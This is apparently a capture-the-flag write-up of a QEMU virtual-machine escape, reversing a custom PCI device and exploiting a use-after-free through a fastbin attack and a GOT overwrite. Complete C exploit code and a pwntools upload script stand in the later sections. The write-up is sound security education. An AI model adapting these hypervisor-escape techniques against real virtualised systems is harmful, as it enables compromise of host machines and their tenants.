# elastic cloud compute (memory) corruption

On connecting to the service, we get the logs of a Linux VM starting up, and then a message at the end saying we have to break out of the VM.

```
[    5.556140]   Magic number: 2:935:78
[    5.564694] rtc_cmos 00:00: setting system clock to 2018-05-14 13:03:13 UTC (1526302993)
[    5.593897] BIOS EDD facility v0.16 2004-Jun-25, 0 devices found
[    5.594272] EDD information not available.
[    5.664625] Freeing unused kernel memory: 1508K
[    5.665151] Write protecting the kernel read-only data: 14336k
[    5.674076] Freeing unused kernel memory: 1696K
[    5.678753] Freeing unused kernel memory: 100K
[    5.961071] clocksource: Switched to clocksource tsc

Boot took 5.99 seconds


break out of the vm, but don't forget to have fun!

/bin/sh: can't access tty; job control turned off
/ # 
```

We're also given the files (qemu binary, linux filesystem and run.sh) to replicate the environment locally.
Taking a look at the `run.sh` file, we notice a interesting `-device ooo` argument.

```sh
./qemu-system-x86_64 -initrd ./initramfs-busybox-x86_64.cpio.gz -nographic -kernel ./vmlinuz-4.4.0-119-generic
                     -append "priority=low console=ttyS0" -device ooo
```

If we output the device list in the qemu binary using `./qemu-system-x86_64 -device help`, we notice the `ooo` device in the misc section.

```
Uncategorized devices:
.
.
.
name "nvdimm", desc "DIMM memory module"
name "ooo", bus PCI
name "pc-dimm", desc "DIMM memory module"
name "sd-card", bus sd-bus
.
.
.
```

This tells us that the code for the `ooo` device is in the binary itself, and we need to reverse it.

Opening the binary in IDA, we find some interesting strings.

```
.rodata:0000000000B63280  0000003C  C OOO: DMA range 0x%.8x-0x%.8x out of bounds (0x%.8x-0x%.8x)!
.rodata:0000000000B632C0  00000027  C OOO: clamping DMA %#.16lx to %#.16lx!\n
.rodata:0000000000B63388  00000015  C hw/misc/oooverflow.c
.rodata:0000000000B633A1  00000009  C ooo-mmio
.rodata:0000000000B633AA  0000000B  C cat ./flag
.rodata:0000000000B633B9  00000007  C uint64
.rodata:0000000000B633C0  00000009  C dma_mask
.rodata:0000000000B633C9  0000000B  C pci-device
.rodata:0000000000B633E0  00000012  C ooo_instance_init
.rodata:0000000000B633F8  0000000F  C ooo_class_init
.rodata:0000000000B63488  00000018  C conventional-pci-device
.rodata:0000000000B634A0  00000010  C hw/misc/unimp.c
```

The `cat ./flag` string is part of this function, which we refer to as `win_function`. This tells us that
we have to exploit the device driver to get the qemu binary to redirect execution to this function.

```c
unsigned __int64 __fastcall win_function(__int64 a1)
{
  unsigned __int64 v1; // ST28_8
  unsigned int v2; // eax

  v1 = __readfsqword(0x28u);
  v2 = system("cat ./flag");
  printf("%d\n", v2);
  sub_999B79((pthread_mutex_t *)(a1 + 2520), (__int64)"hw/misc/oooverflow.c", 0x12Eu);
  *(_BYTE *)(a1 + 2624) = 1;
  sub_999C8A((pthread_mutex_t *)(a1 + 2520), (__int64)"hw/misc/oooverflow.c", 0x130u);
  sub_999E2D(a1 + 2568);
  sub_99A8FD(a1 + 2512);
  sub_999DCD(a1 + 2568);
  sub_999B19(a1 + 2520);
  sub_994A52(a1 + 2680);
  return __readfsqword(0x28u) ^ v1;
}
```

At this point, we take a look at some of the example PCI drivers in qemu to help with the reversing,
mainly `hw/misc/edu.c` (https://github.com/qemu/qemu/blob/master/hw/misc/edu.c).

Surprisingly, a lot of the code from the educational driver matches with the driver for `ooo`, so we can quickly
name the functions and figure out the important ones.

```
ooo_msi_enabled .text 00000000006E5D1A  0000001A  00000018  00000000  R . . . B . .
ooo_raise_irq .text 00000000006E5D34  0000006D  00000018  00000000  R . . . B . .
ooo_lower_irq .text 00000000006E5DA1  0000005F  00000018  00000000  R . . . B . .
within  .text 00000000006E5E00  0000002E  00000014  00000000  R . . . B . .
ooo_check_range .text 00000000006E5E2E  0000008B  00000028  00000000  R . . . B . .
ooo_clamp_addr  .text 00000000006E5EB9  0000004D  00000028  00000000  R . . . B . .
ooo_dma_timer .text 00000000006E5F06  000001AC  00000048  00000000  R . . . B . .
dma_rw  .text 00000000006E60B2  0000008A  00000028  00000000  R . . . B . .
ooo_mmio_read .text 00000000006E613C  000000B8  00000058  00000000  R . . . B T .
ooo_mmio_write  .text 00000000006E61F4  00000126  00000048  00000000  R . . . B T .
ooo_fact_thread .text 00000000006E631A  0000018B  00000028  00000000  R . . . B . .
pci_ooo_realize .text 00000000006E64A5  00000154  00000048  00000000  R . . . B . .
win_function  .text 00000000006E65F9  000000FA  00000038  00000000  R . . . B . .
ooo_obj_uint64  .text 00000000006E66F3  0000003F  00000048  00000000  R . . . B . .
ooo_instance_init .text 00000000006E6732  000000AC  00000028  00000000  R . . . B . .
ooo_class_init  .text 00000000006E67DE  00000088  00000028  00000000  R . . . B . .
```

From these, we want to focus on the `ooo_mmio_read` and `ooo_mmio_write` functions, which seem to be the only
way to interact with the driver.

```c
__int64 __fastcall ooo_mmio_read(__int64 opaque, int addr, unsigned int size)
{
  unsigned int v4; // [rsp+34h] [rbp-1Ch]
  __int64 dest; // [rsp+38h] [rbp-18h]
  __int64 v6; // [rsp+40h] [rbp-10h]
  unsigned __int64 v7; // [rsp+48h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  v6 = opaque;
  dest = 0x42069LL;
  v4 = (addr & 0xF0000u) >> 16;
  if ( (addr & 0xF00000u) >> 20 != 0xF && mmio_buffer[v4] )
    memcpy(&dest, (char *)mmio_buffer[v4] + (signed __int16)addr, size);
  return dest;
}

void __fastcall ooo_mmio_write(__int64 opaque, __int64 addr, __int64 val, unsigned int size)
{
  unsigned int v4; // eax
  char n[12]; // [rsp+4h] [rbp-3Ch]
  __int64 v6; // [rsp+10h] [rbp-30h]
  __int64 v7; // [rsp+18h] [rbp-28h]
  __int16 v8; // [rsp+22h] [rbp-1Eh]
  int i; // [rsp+24h] [rbp-1Ch]
  unsigned int v10; // [rsp+28h] [rbp-18h]
  unsigned int v11; // [rsp+2Ch] [rbp-14h]
  unsigned int v12; // [rsp+34h] [rbp-Ch]
  __int64 v13; // [rsp+38h] [rbp-8h]

  v7 = opaque;
  v6 = addr;
  *(_QWORD *)&n[4] = val;
  v13 = opaque;
  v10 = ((unsigned int)addr & 0xF00000) >> 20;
  v4 = ((unsigned int)addr & 0xF00000) >> 20;
  switch ( v4 )
  {
    case 1u:
      free(mmio_buffer[((unsigned int)v6 & 0xF0000) >> 16]);
      break;
    case 2u:
      v12 = ((unsigned int)v6 & 0xF0000) >> 16;
      v8 = v6;
      memcpy((char *)mmio_buffer[v12] + (signed __int16)v6, &n[4], size);
      break;
    case 0u:
      v11 = ((unsigned int)v6 & 0xF0000) >> 16;
      if ( v11 == 0xF )
      {
        for ( i = 0; i <= 14; ++i )
          mmio_buffer[i] = malloc(8LL * *(_QWORD *)&n[4]);
      }
      else
      {
        mmio_buffer[v11] = malloc(8LL * *(_QWORD *)&n[4]);
      }
      break;
  }
}
```

So we can call `ooo_mmio_read` with a `addr` and a `size` parameter, and `ooo_mmio_write` with `addr`, `val` and `size` parameter.
To call these functions from the VM, we are given access to a special file of 16777216 bytes, which is located at
`/sys/devices/pci0000:00/0000:00:04.0/resource0`. We treat this as a memory-mapped region using mmap,
and we can read/write 1, 2, 4, 8 bytes at any addr in the [0, 16777215] range.
(Later in debugging, it turned out that doing a 8 byte read/write would do it in 2 read/writes of 4 bytes each).

This is the code to do some basic read/write to the device.

```c
#include <stdint.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>

void* iomem;

void iowrite(uint32_t offset, uint32_t value) {
  *((uint32_t*)(iomem + offset)) = value;
}

uint32_t ioread(uint32_t offset) {
  return *((uint32_t*)(iomem + offset));
}

int main() {
  int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
  iomem = mmap(0, 0x1000000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  printf("iomem @ %p\n", iomem);
}
```

So the driver code has a array `mmio_buffer` of type `void *mmio_buffer[15]`. The array stores a list of
pointers to the heap in the qemu process.

In `ooo_mmio_read`, we can read data from the `mmio_buffer[i] + x` address, where we can control i, x using the address we read from.
i is controlled by bits 16-20 of the address, and the first 16 bits of the address control x. As there is a `(signed)` cast on x,
x can also be negative, and is in range -32767 to 32767. The `size` argument is either 1, 2 or 4 depending on the size you read.

In `ooo_mmio_write`, we have three operations, which are controlled by the bits 20-24 of the address. We also have control on
a extra value `val` which is basically the value we are writing to the address inside the VM. This range of this value will depend
on the `size` we are writing.

0. `mmio_buffer[i] = malloc(8 * val)`
1. `free(mmio_buffer[i])`
2. `memcpy(mmio_buffer[i] + x, &val, size)`

Again, i and x can be controlled by the address similar to in the read function.

Looking at this, we can see a simple UAF vulnerability, which means we can modify the data in the freed chunks
to get a fastbin attack.

If we can find some 64-bit value in the binary which is a valid fastbin size ([0x20, 0x80]), we can use that as a fake chunk
and get malloc to return that address. This means, that if we find a fastbin size around the pointers array, we can set some `mmio_buffer[j]`
to that address and then use the `mmio_buffer[j] +/- x` write functionality to write any arbitrary address to the pointers array.

The address of the `mmio_buffer` is `0x1317940`, and we can find a nice candidate for a fake chunk with size `0x66` at `0x1317a02`.
Now if we do malloc(0x58) 2-3 times so that it requests from the 0x60 fastbin, it will return the address of the fake chunk.
From here, we can calcualte the offset to pointers[0] and write the address of `malloc@GOT` to that, and then write to pointers[0] to overwrite
malloc with win_function. This is the final exploit code that works in the local environment.

```c
#include <stdint.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>

void* iomem;

void iowrite(uint32_t offset, uint32_t value) {
  *((uint32_t*)(iomem + offset)) = value;
}

void iowrite_64(uint32_t offset, uint64_t value) {
  *((uint64_t*)(iomem + offset)) = value;
}

// i == 0xF => mallocs all indexes
void driver_malloc(uint8_t i, uint32_t multiplier) {
  iowrite(0x000000 | (((uint32_t)i) << 16), multiplier);
}

void driver_free(uint8_t i) {
  iowrite(0x100000 | (((uint32_t)i) << 16), 0);
}

void driver_write64(uint8_t i, uint16_t off, uint64_t value) {
  iowrite_64(0x200000 | (((uint32_t)i) << 16) | off, value);
}

int main() {
  int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
  iomem = mmap(0, 0x1000000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  printf("iomem @ %p\n", iomem);

  driver_malloc(0x0, 11);
  driver_malloc(0x1, 11);
  driver_free(0x0);
  driver_free(0x1);
  driver_free(0x0);
  driver_malloc(0x0, 11);
  driver_write64(0x0, 0, 0x1317a02-0x8);
  driver_malloc(0x0, 11);
  driver_malloc(0x0, 11);
  driver_malloc(0x1, 11);
  driver_write64(0x1, -202, 0x1130b78);
  driver_write64(0x0, 0, 0x6E65F9);
  driver_malloc(0x0, 0x0);
}
```

Now, it's a bit more work to get this working remotely as there is no internet connection in the VM,
so we need to copy the code remotely. We can gzip the compiled code, and send it base64 encoded in chunks
once we connect. The gzip and base64 encoded file is around 400 kb, so if you get a AWS instance in the same region
as the remote server, you can get it working under the timeout. This is the code for sending the exploit

```python
import sys
from pwn import *

sys.path.append('..')
import proof_of_work

proc = remote('11d9f496.quals2018.oooverflow.io', 31337)
proc.recvline()
challenge = proc.recvline().strip().split()[-1]
n = int(proc.recvline().strip().split()[-1])
proc.recvline()
print('Solving challenge: "{}", n: {}'.format(challenge, n))
solution = proof_of_work.solve_pow(challenge, n)
print('Solution: {} -> {}'.format(solution, proof_of_work.pow_hash(challenge, solution)))
proc.sendline(str(solution))

proc.recvuntil("/ # ")
proc.sendline("touch b")

exploit = open('exploit.gz', 'rb').read()
exploit_b64 = b64e(exploit)
print len(exploit_b64)

for i in range(0, len(exploit_b64), 1000):
    print i
    proc.recvuntil("/ # ")
    command = "echo -ne \"" + exploit_b64[i:i+1000] + "\" >> b"
    proc.sendline(command)

proc.sendline("")
proc.sendline("")
proc.recvuntil("/ # ")
proc.sendline("cat b | base64 -d > a.gz")
proc.recvuntil("/ # ")
proc.sendline("gzip -d a.gz")
proc.recvuntil("/ # ")
proc.sendline("chmod +x ./a")
proc.recvuntil("/ # ")
proc.sendline("./a")

proc.interactive()


# OOO{did you know that the cloud is safe}
```
